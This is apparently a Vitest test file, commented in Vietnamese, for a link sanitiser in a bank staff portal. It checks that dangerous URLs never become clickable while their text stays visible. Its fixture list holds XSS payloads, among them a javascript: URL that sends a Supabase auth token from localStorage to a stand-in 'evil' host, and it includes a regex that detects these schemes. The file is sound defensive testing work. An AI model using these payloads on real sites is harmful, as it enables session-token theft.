import { describe, it, expect } from 'vitest';
import { safeHref, tachBangChung } from '@/lib/safeUrl';

/**
 * Bộ này canh CÁI LỖ đã có thật, không chỉ canh bộ lọc.
 *
 * `safeHref` vốn đã đúng và đã có test cạnh nó (src/lib/safeUrl.test.ts).
 * Nhưng hai bàn gọi nó lại viết `safeHref(url) ?? url`: đúng lúc bộ lọc từ
 * chối một giá trị xấu thì `?? url` trả nguyên giá trị đó về chỗ cũ — bộ lọc
 * coi như không tồn tại. Vì vậy phần quan trọng nhất dưới đây là khẳng định
 * `tachBangChung` KHÔNG BAO GIỜ đặt chuỗi bị từ chối vào ô `lienKet`, đồng
 * thời KHÔNG đánh rơi chữ của cán bộ.
 */

const XAU = [
  "javascript:fetch('https://evil/?t='+localStorage.getItem('sb-auth-token'))",
  'JaVaScRiPt:alert(1)',
  '  javascript:alert(1)  ',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
];

const TOT = [
  'https://vietinbank.vn/tai-lieu.pdf',
  'http://noibo.local/bang-chung',
  'mailto:cn343@example.com',
];

describe('safeHref — ma trận giao thức', () => {
  it('giữ http/https/mailto', () => {
    for (const u of TOT) expect(safeHref(u)).toBe(u);
  });

  it('loại javascript:/data:/vbscript:', () => {
    for (const u of XAU) expect(safeHref(u)).toBeUndefined();
  });

  it('rỗng/null/undefined không làm ném lỗi', () => {
    expect(safeHref('')).toBeUndefined();
    expect(safeHref('   ')).toBeUndefined();
    expect(safeHref(null)).toBeUndefined();
    expect(safeHref(undefined)).toBeUndefined();
  });
});

describe('tachBangChung', () => {
  it('link an toàn thì bấm được, không nhân đôi thành chữ', () => {
    for (const u of TOT) {
      expect(tachBangChung(u)).toEqual({ lienKet: u, chuThuong: null });
    }
  });

  it('đường dẫn tương đối vẫn là link (tệp trong cổng)', () => {
    expect(tachBangChung('/ho-so/bang-chung.png'))
      .toEqual({ lienKet: '/ho-so/bang-chung.png', chuThuong: null });
  });

  it('giá trị xấu KHÔNG BAO GIỜ lọt vào lienKet — đây chính là lỗ «?? url»', () => {
    for (const u of XAU) {
      expect(tachBangChung(u).lienKet).toBeNull();
    }
  });

  it('nhưng vẫn giữ nguyên văn để cán bộ đọc được, chỉ mất khả năng bấm', () => {
    // Bỏ hẳn chuỗi bị từ chối là mất thông tin nghiệp vụ, nên nó phải rơi
    // xuống `chuThuong` để dòng thời gian hiện dạng chữ.
    for (const u of XAU) {
      expect(tachBangChung(u).chuThuong).toBe(u.trim());
    }
  });

  it('ghi chú tự do đi lối «đường dẫn tương đối», không rơi mất chữ', () => {
    // Cán bộ hay gõ ghi chú vào ô này. `new URL('...', origin)` coi mọi chuỗi
    // không có giao thức là ĐƯỜNG DẪN TƯƠNG ĐỐI cùng miền, nên safeHref nhận
    // — an toàn (cùng miền), và nơi hiển thị vẫn chỉ mở thẻ <a> khi chuỗi bắt
    // đầu bằng http(s), tức ghi chú hiện dạng chữ như trước. Ghi lại đây để
    // lần sau đọc `lienKet` khác null đừng tưởng là lỗ hổng.
    const ghiChu = 'đã gửi qua Zalo cho anh Hùng';
    expect(tachBangChung(ghiChu).lienKet).toBe(ghiChu);
    expect(tachBangChung(ghiChu).lienKet).not.toMatch(/^(javascript|data|vbscript):/i);
  });

  it('ô trống trả hai null — dòng thời gian không hiện gì thêm', () => {
    for (const v of ['', '   ', null, undefined]) {
      expect(tachBangChung(v)).toEqual({ lienKet: null, chuThuong: null });
    }
  });
});
